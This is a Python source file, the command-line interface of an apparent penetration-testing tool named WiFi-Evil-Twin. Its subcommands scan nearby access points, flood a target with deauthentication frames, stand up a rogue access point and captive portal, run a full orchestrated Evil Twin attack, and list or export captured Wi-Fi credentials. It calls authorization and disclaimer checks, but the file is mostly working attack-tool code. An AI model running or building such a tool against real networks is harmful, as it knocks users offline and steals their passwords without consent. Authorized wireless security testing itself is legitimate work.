"""Command-line interface for WiFi-Evil-Twin.

Subcommands:
    scan     Enumerate nearby access points.
    deauth   Send deauthentication frames to a target AP.
    ap       Start only the rogue access point.
    portal   Start only the captive portal (AP already up).
    run      Full orchestrated Evil Twin attack.
    creds    List / export / clear captured credentials.
    version  Print version.
"""

from __future__ import annotations

import argparse
import sys
from typing import List, Optional

from wifi_evil_twin import __version__
from wifi_evil_twin.config import Config, DEFAULTS
from wifi_evil_twin.core import access_point, scanner
from wifi_evil_twin.core.captive_portal import run_portal
from wifi_evil_twin.core.credentials import CredentialStore
from wifi_evil_twin.core.deauth import deauth
from wifi_evil_twin.core.orchestrator import Orchestrator
from wifi_evil_twin.exceptions import WiFiEvilTwinError
from wifi_evil_twin.utils.disclaimer import require_authorization, show_disclaimer
from wifi_evil_twin.utils.system import require_root


def _maybe_require_root(args: argparse.Namespace) -> None:
    """Require root only when actually executing (not in --dry-run)."""
    if not getattr(args, "dry_run", False):
        require_root()

# Attributes that can be overridden from the CLI for run/ap/portal.
OVERRIDE_KEYS = [
    "ssid", "interface", "monitor_interface", "channel", "gateway_ip",
    "dhcp_start", "dhcp_end", "encryption", "wpa_passphrase", "portal_port",
    "scenario", "deauth", "deauth_bssid", "deauth_client",
]


def build_config(args: argparse.Namespace) -> Config:
    """Create a Config from optional --config file + CLI overrides."""
    cfg = Config()
    if getattr(args, "config", None):
        cfg = Config.load(args.config)
    for key in OVERRIDE_KEYS:
        val = getattr(args, key, None)
        if val is not None:
            setattr(cfg, key, val)
    if getattr(args, "dry_run", False):
        cfg.dry_run = True
    cfg.validate()
    return cfg


def _store_from(cfg: Config) -> CredentialStore:
    cfg.ensure_dirs()
    return CredentialStore(cfg.captures_path(), cfg.captures_csv_path())


# ---------------------------------------------------------------------------
# Subcommand handlers
# ---------------------------------------------------------------------------
def cmd_scan(args: argparse.Namespace) -> int:
    _maybe_require_root(args)
    require_authorization()
    nets = scanner.scan(
        args.iface, duration=args.duration, dry_run=args.dry_run, prefer=args.prefer
    )
    if args.dry_run:
        return 0
    if not nets:
        print("No networks found (or scan not supported in this environment).")
        return 0
    print(f"\nFound {len(nets)} network(s):\n")
    for n in sorted(nets, key=lambda x: x.signal, reverse=True):
        print("  " + str(n))
    print()
    return 0


def cmd_deauth(args: argparse.Namespace) -> int:
    _maybe_require_root(args)
    require_authorization()
    deauth(
        monitor_iface=args.iface,
        bssid=args.bssid,
        client=args.client,
        packets=args.packets,
        tool=args.tool,
        duration=args.duration,
        dry_run=args.dry_run,
    )
    return 0


def cmd_ap(args: argparse.Namespace) -> int:
    _maybe_require_root(args)
    require_authorization()
    cfg = build_config(args)
    proc = access_point.start_ap(cfg, dry_run=cfg.dry_run)
    if cfg.dry_run:
        return 0
    print(f"[+] Rogue AP '{cfg.ssid}' started (pid={getattr(proc, 'pid', '?')}). "
          f"Ctrl-C to stop.")
    try:
        proc.wait()
    except KeyboardInterrupt:  # pragma: no cover
        proc.terminate()
    return 0


def cmd_portal(args: argparse.Namespace) -> int:
    _maybe_require_root(args)
    require_authorization()
    cfg = build_config(args)
    store = _store_from(cfg)
    run_portal(cfg, store, dry_run=cfg.dry_run)
    return 0


def cmd_run(args: argparse.Namespace) -> int:
    _maybe_require_root(args)
    require_authorization()
    cfg = build_config(args)
    if args.save_config:
        cfg.save(args.save_config)
        print(f"[*] Resolved config written to {args.save_config}")
    store = _store_from(cfg)
    orch = Orchestrator(cfg, store)
    orch.start()
    return 0


def cmd_creds(args: argparse.Namespace) -> int:
    cfg = Config()
    if args.config:
        cfg = Config.load(args.config)
    cfg.ensure_dirs()
    store = CredentialStore(cfg.captures_path(), cfg.captures_csv_path())
    if args.clear:
        store.clear()
        print("[+] Captured credentials cleared.")
        return 0
    if args.export:
        store.export_csv(args.export)
        print(f"[+] Exported to {args.export}")
        return 0
    recs = store.all()
    if not recs:
        print("No captured credentials yet.")
        return 0
    print(f"\n{len(recs)} captured credential(s):\n")
    for r in recs:
        fields = ", ".join(f"{k}={v}" for k, v in r.fields.items())
        print(f"  [{r.timestamp}] {r.client_ip} via '{r.scenario}' on {r.ssid}")
        print(f"      {fields}")
    print()
    return 0


def cmd_version(_args: argparse.Namespace) -> int:
    print(f"WiFi-Evil-Twin {__version__}")
    return 0


# ---------------------------------------------------------------------------
# Argument parser
# ---------------------------------------------------------------------------
def build_parser() -> argparse.ArgumentParser:
    # Shared flags available both before and after the subcommand.
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--dry-run", action="store_true",
                        help="Print commands instead of executing them.")
    common.add_argument("--config", help="Load a JSON config file.")

    p = argparse.ArgumentParser(
        prog="wifi-evil-twin",
        description="Authorized Evil Twin / rogue-AP WiFi testing framework.",
        parents=[common],
    )
    sub = p.add_subparsers(dest="command", required=True)

    # scan
    s = sub.add_parser("scan", parents=[common],
                       help="Enumerate nearby access points.")
    s.add_argument("--iface", default="wlan0")
    s.add_argument("--duration", type=int, default=10)
    s.add_argument("--prefer", default="auto", choices=["auto", "airodump", "iw"])
    s.set_defaults(func=cmd_scan)

    # deauth
    d = sub.add_parser("deauth", parents=[common],
                       help="Send deauth frames to a target AP.")
    d.add_argument("--iface", default="wlan0", help="Monitor-mode interface.")
    d.add_argument("--bssid", required=True)
    d.add_argument("--client", default="", help="Target client MAC (optional).")
    d.add_argument("--packets", type=int, default=0, help="0 = continuous.")
    d.add_argument("--duration", type=float, default=None)
    d.add_argument("--tool", default="aireplay-ng", choices=["aireplay-ng", "mdk4"])
    d.set_defaults(func=cmd_deauth)

    # ap
    a = sub.add_parser("ap", parents=[common],
                       help="Start only the rogue access point.")
    _add_run_args(a)
    a.set_defaults(func=cmd_ap)

    # portal
    pt = sub.add_parser("portal", parents=[common],
                       help="Start only the captive portal.")
    _add_run_args(pt)
    pt.set_defaults(func=cmd_portal)

    # run
    r = sub.add_parser("run", parents=[common],
                       help="Full orchestrated Evil Twin attack.")
    _add_run_args(r)
    r.add_argument("--deauth", dest="deauth", action="store_true",
                   help="Also deauth the target BSSID during the run.")
    r.add_argument("--deauth-bssid", dest="deauth_bssid", default="")
    r.add_argument("--deauth-client", dest="deauth_client", default="")
    r.add_argument("--save-config", dest="save_config", default=None,
                   help="Write the resolved config to this path.")
    r.set_defaults(func=cmd_run)

    # creds
    c = sub.add_parser("creds", parents=[common],
                       help="Manage captured credentials.")
    c.add_argument("--list", action="store_true")
    c.add_argument("--export", help="Export captures CSV to this path.")
    c.add_argument("--clear", action="store_true")
    c.set_defaults(func=cmd_creds)

    # version
    v = sub.add_parser("version", parents=[common], help="Show version.")
    v.set_defaults(func=cmd_version)

    return p


def _add_run_args(p: argparse.ArgumentParser) -> None:
    p.add_argument("--ssid", default=None)
    p.add_argument("--interface", default=None)
    p.add_argument("--monitor-interface", dest="monitor_interface", default=None)
    p.add_argument("--channel", type=int, default=None)
    p.add_argument("--gateway-ip", dest="gateway_ip", default=None)
    p.add_argument("--dhcp-start", dest="dhcp_start", default=None)
    p.add_argument("--dhcp-end", dest="dhcp_end", default=None)
    p.add_argument("--encryption", default=None, choices=["open", "wpa2"])
    p.add_argument("--wpa-passphrase", dest="wpa_passphrase", default=None)
    p.add_argument("--portal-port", dest="portal_port", type=int, default=None)
    p.add_argument("--scenario", default=None, choices=["router", "generic", "social"])


def main(argv: Optional[List[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        return args.func(args)
    except WiFiEvilTwinError as e:
        print(f"[!] {e}", file=sys.stderr)
        return 2
    except KeyboardInterrupt:  # pragma: no cover
        print("\n[!] Interrupted.")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
